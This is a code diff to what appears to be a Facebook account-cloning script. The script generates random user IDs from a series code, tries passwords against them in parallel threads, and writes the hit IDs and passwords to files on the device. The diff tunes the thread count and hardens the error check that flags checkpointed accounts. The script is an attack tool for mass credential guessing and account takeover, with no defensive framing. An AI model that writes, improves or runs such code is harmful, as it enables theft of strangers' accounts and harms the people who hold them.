@@ -379,7 +379,7 @@ def START_SERIES_CLONING(series_code):
     for i in range(limit):
         uid = series_code + ''.join(random.choices(string.digits, k=9))
         user.append(uid)
-    with tred(max_workers=40) as jihad:
+    with tred(max_workers=30) as jihad:
         clear()
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
@@ -464,7 +464,7 @@ def login1(uid):
                 os.system('espeak -a 300 "OK ID Found"')
                 break
 
-            elif "www.facebook.com" in rp['error']['message']:
+            elif "error" in rp and "www.facebook.com" in rp.get("error", {}).get("message", ""):
                 cps.append(uid)
                 open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                 print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
